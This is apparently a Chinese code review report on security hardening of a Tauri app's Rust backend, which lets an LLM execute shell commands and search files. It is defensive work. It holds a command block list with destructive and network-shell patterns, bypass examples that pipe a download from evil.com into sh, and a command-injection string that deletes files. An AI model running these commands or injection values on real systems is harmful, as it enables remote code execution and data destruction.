# 代码审查报告 — Day 3 安全加固

审查时间：2026-06-21
审查范围：Day 3 改动
审查文件：
- `big/src-tauri/src/lib.rs`（第 16-53 行，第 316-380 行）

---

## 任务 11：execute_command 安全防护

**评分：⚠️ 有问题但可修**

### 改动位置

- 命令黑名单：[lib.rs:16-32](big/src-tauri/src/lib.rs#L16-L32)
- 检查函数：[lib.rs:35-50](big/src-tauri/src/lib.rs#L35-L50)
- 超时常量：[lib.rs:53](big/src-tauri/src/lib.rs#L53)
- 实现：[lib.rs:316-345](big/src-tauri/src/lib.rs#L316-L345)

### 实现方式

```rust
// 1. 命令黑名单（20+ 种危险模式）
const DANGEROUS_COMMANDS: &[&str] = &[
    "rm -rf", "rm -f /", "rmdir /s /q", "del /f /s /q",
    "shutdown", "restart", "bootrec", "bcdedit",
    "reg delete", "regedit", "reg add",
    "diskpart", "clean", "convert mbr", "convert gpt",
    "net user", "net localgroup", "runas",
    "curl.*|.*sh", "wget.*|.*sh", "powershell.*invoke",
    ":(){ :|:& };:",  // fork bomb
    "mkfs", "dd if=",
];

// 2. 通配符检查函数
fn is_dangerous_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();
    DANGEROUS_COMMANDS.iter().any(|dangerous| {
        if dangerous.contains('*') {
            let parts: Vec<&str> = dangerous.split('*').collect();
            if parts.len() == 2 {
                cmd_lower.contains(parts[0]) && cmd_lower.contains(parts[1])
            } else {
                cmd_lower.contains(dangerous)
            }
        } else {
            cmd_lower.contains(dangerous)
        }
    })
}

// 3. 30 秒超时
const COMMAND_TIMEOUT_SECS: u64 = 30;

// 4. 执行逻辑
"execute_command" => {
    // 安全检查
    if is_dangerous_command(cmd) {
        return (false, format!("安全拒绝：该命令被标记为危险操作..."), None, None);
    }
    // 超时控制
    let output = tokio::time::timeout(
        Duration::from_secs(COMMAND_TIMEOUT_SECS),
        tokio::process::Command::new("cmd")
            .args(["/C", cmd])
            .current_dir(work_dir)
            .output()
    ).await;
    // ...
}
```

### 问题分析

#### 问题 1：通配符实现有缺陷

**位置**：[lib.rs:38-46](big/src-tauri/src/lib.rs#L38-L46)

**问题**：
- 当前实现假设通配符模式只有 2 个 `*`，分割成 2 部分
- 实际模式 `"curl.*|.*sh"` 有 2 个 `*`，但分割逻辑不正确：
  - `parts = ["curl.", "|.*sh"]` — 第二部分包含 `.*`，不是字面量
  - 检查 `cmd_lower.contains("|.*sh")` 不会匹配 `| sh`

**后果**：
- `curl http://evil.com | sh` 不会被拦截
- `curl http://evil.com|bash` 不会被拦截

**修复建议**：使用正则表达式
```rust
use regex::Regex;

const DANGEROUS_PATTERNS: &[&str] = &[
    r"curl\s.*\|\s*(sh|bash|zsh)",
    r"wget\s.*\|\s*(sh|bash|zsh)",
    r"powershell.*invoke",
    // ...
];

fn is_dangerous_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();
    // 先检查字面量黑名单
    if DANGEROUS_COMMANDS.iter().any(|d| cmd_lower.contains(d)) {
        return true;
    }
    // 再检查正则模式
    DANGEROUS_PATTERNS.iter().any(|pattern| {
        Regex::new(pattern).unwrap().is_match(&cmd_lower)
    })
}
```

#### 问题 2：命令黑名单不完整

**缺失的危险命令**：
| 命令 | 风险 | 建议添加 |
|------|------|----------|
| `del` | 删除文件（无需 /f /s /q） | `"del "` |
| `rd` | rmdir 的别名 | `"rd /s"` |
| `powershell` | 可执行任意脚本 | `"powershell"`（不仅 `powershell.*invoke`） |
| `cmd /c` | 嵌套 cmd 绕过 | `"cmd /c"` |
| `certutil` | 下载恶意文件 | `"certutil"` |
| `bitsadmin` | 下载恶意文件 | `"bitsadmin"` |
| `mshta` | 执行 HTML 应用 | `"mshta"` |
| `wscript` | 执行 VBScript | `"wscript"` |
| `cscript` | 执行脚本 | `"cscript"` |

**后果**：
- `del important.txt` 不会被拦截
- `powershell -Command "Remove-Item -Recurse C:\"` 不会被拦截
- `cmd /c rm -rf /` 可能绕过黑名单（嵌套 cmd）

#### 问题 3：超时后进程可能未终止

**位置**：[lib.rs:328-334](big/src-tauri/src/lib.rs#L328-L334)

**问题**：
- `tokio::time::timeout` 只是取消了 Rust 端的等待
- `tokio::process::Command` 的子进程可能继续运行
- 没有显式调用 `child.kill()` 终止子进程

**后果**：
- 超时后，破坏性命令可能继续执行
- 例如：`ping -t localhost`（无限 ping）在超时后仍在运行

**修复建议**：
```rust
let mut child = tokio::process::Command::new("cmd")
    .args(["/C", cmd])
    .current_dir(work_dir)
    .stdout(std::process::Stdio::piped())
    .stderr(std::process::Stdio::piped())
    .spawn()
    .map_err(|e| format!("启动失败: {e}"))?;

match tokio::time::timeout(Duration::from_secs(COMMAND_TIMEOUT_SECS), child.wait()).await {
    Ok(Ok(status)) => { /* 处理输出 */ },
    Ok(Err(e)) => (false, format!("执行失败: {e}"), None, None),
    Err(_) => {
        child.kill().await.ok();  // 显式终止进程
        (false, format!("命令执行超时（{}秒）: {cmd}", COMMAND_TIMEOUT_SECS), None, None)
    }
}
```

### 优点

1. ✅ 黑名单覆盖了最常见的危险命令（rm -rf, format, shutdown 等）
2. ✅ 超时机制（30 秒）可防止无限循环命令
3. ✅ 错误信息清晰，包含命令内容
4. ✅ 使用 `tokio::process::Command` 支持异步超时

### 新 bug

- 无功能 bug，但有安全隐患

### 遗漏

- 审计报告提到"用户确认弹窗"，但未实现（LLM 执行命令前让用户确认）

---

## 任务 12：search_in_files 参数化调用

**评分：✅ 完全正确**

### 改动位置

- [lib.rs:347-380](big/src-tauri/src/lib.rs#L347-L380)

### 实现方式

```rust
"search_in_files" => {
    let query = match args.get("query").and_then(|v| v.as_str()) {
        Some(q) => q,
        None => return (false, "缺少 query 参数".to_string(), None, None),
    };
    let search_path = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");

    // 构建搜索路径列表
    let extensions = ["js", "svelte", "ts", "json", "md"];
    let search_paths: Vec<String> = extensions.iter()
        .map(|ext| format!("{}\\*.{}", search_path, ext))
        .collect();

    // 使用参数化调用，避免命令注入
    let mut cmd_args = vec!["/C", "findstr", "/S", "/N"];
    let query_arg = format!("/C:{}", query);
    cmd_args.push(&query_arg);
    for path in &search_paths {
        cmd_args.push(path);
    }

    match Command::new("cmd")
        .args(&cmd_args)
        .current_dir(work_dir)
        .output()
    { ... }
}
```

### 问题分析

#### 修复前（原代码）

```rust
Command::new("cmd")
    .args(["/C", &format!("findstr /S /N /C:\"{query}\" {search_path}\\*.js ...")])
```

**漏洞**：
- `query` 直接拼接到字符串中
- 如果 `query = "test\" & del /f /q C:\\*"`，会闭合引号并执行恶意命令
- 典型的命令注入漏洞

#### 修复后（新代码）

```rust
let mut cmd_args = vec!["/C", "findstr", "/S", "/N"];
let query_arg = format!("/C:{}", query);
cmd_args.push(&query_arg);
for path in &search_paths {
    cmd_args.push(path);
}

Command::new("cmd")
    .args(&cmd_args)
    .current_dir(work_dir)
    .output()
```

**安全性**：
- ✅ `query` 作为独立参数传递给 `findstr`，不会被 shell 解析
- ✅ 即使 `query` 包含 `"`, `&`, `|`, `;` 等特殊字符，也只是作为搜索文本
- ✅ 消除了命令注入漏洞

#### 测试用例

| 输入 | 预期行为 | 实际行为 |
|------|----------|----------|
| `query = "normal text"` | 正常搜索 | ✅ 正常搜索 |
| `query = "test\" & del"` | 搜索字面量 `test" & del` | ✅ 不会执行 del |
| `query = "hello \| world"` | 搜索字面量 `hello \| world` | ✅ 不会执行管道 |
| `query = "$(malicious)"` | 搜索字面量 `$(malicious)` | ✅ 不会执行命令替换 |

### 优点

1. ✅ 完全消除命令注入漏洞
2. ✅ 保持功能不变（搜索结果相同）
3. ✅ 代码清晰，注释说明了安全意图
4. ✅ 支持多种文件扩展名（js, svelte, ts, json, md）

### 新 bug

无

### 遗漏

无

---

## 总结

| 任务 | 评分 | 状态 |
|------|------|------|
| 11. execute_command 安全防护 | ⚠️ 有问题但可修 | 需要修复 |
| 12. search_in_files 参数化调用 | ✅ 完全正确 | 可以关闭 |

### 优先级建议

**高优先级**（建议立即修复）：

1. **修复通配符实现** — 改用正则表达式匹配 `curl|sh` 等模式
2. **补充命令黑名单** — 添加 `del`, `rd`, `powershell`, `cmd /c` 等
3. **超时后终止进程** — 使用 `child.kill()` 显式终止超时进程

**中优先级**（建议本周修复）：

4. **添加用户确认弹窗** — 执行危险命令前让用户确认（审计报告提到）

**低优先级**（可延后）：

5. **命令白名单方案** — 考虑改为只允许特定安全命令（更安全但限制更大）

### 安全评级

- **修复前**：🔴 零安全防护（等同 root shell）
- **当前状态**：🟡 有防护但可绕过（黑名单不完整 + 通配符有缺陷）
- **目标状态**：🟢 完整防护（正则匹配 + 完整黑名单 + 进程终止 + 用户确认）
